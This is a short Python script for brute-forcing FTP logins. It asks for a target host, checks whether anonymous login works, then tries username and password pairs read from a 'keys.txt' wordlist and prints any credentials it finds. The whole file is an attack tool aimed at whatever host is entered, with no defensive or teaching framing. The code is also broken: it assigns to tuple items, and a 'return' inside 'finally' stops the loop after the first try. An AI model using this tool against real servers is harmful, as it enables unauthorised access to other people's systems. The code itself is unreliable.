# !/usr/bin python3

import time
from ftplib import FTP


def check_anonymous(ftp):
    ans = True
    try:
        ftp.login()
    except Exception as e:
        ans = False
    finally:
        return ans


def burp_ftp(ftp, filename, type=1):
    ans = (False, '', '')
    dict_pwd = open(filename, "r")
    for line in dict_pwd.readlines():
        try:
            keys = line.replace("\n", '').replace("\r", '').split(",")
            print(keys)
            ftp.login(user=keys[0], passwd=keys[1])

            ans[0] = True;
            ans[1] = keys[0];
            ans[2] = keys[1]
        except Exception as e:
            pass
        finally:
            return ans


def burp(host, port=21):
    ftp = FTP(host)
    ftp.port = port

    if check_anonymous(ftp):
        print("[+] anonymouns FOUND! ", host)
    else:
        ans = burp_ftp(ftp, "keys.txt")
        if ans[0]:
            print("[+] keys FOUND! USER:%10sPWD:%10s" % (ans[1], ans[2]))


def main():
    while True:
        host = input("Please input target FTP host:")

        if host == "quit" or host == "exit":
            break

        print(time.strftime("%a %b %Y %d %H:%M:%S", time.localtime()))
        burp(host)
        print(time.strftime("%a %b %Y %d %H:%M:%S", time.localtime()))


if __name__ == '__main__':
    main()
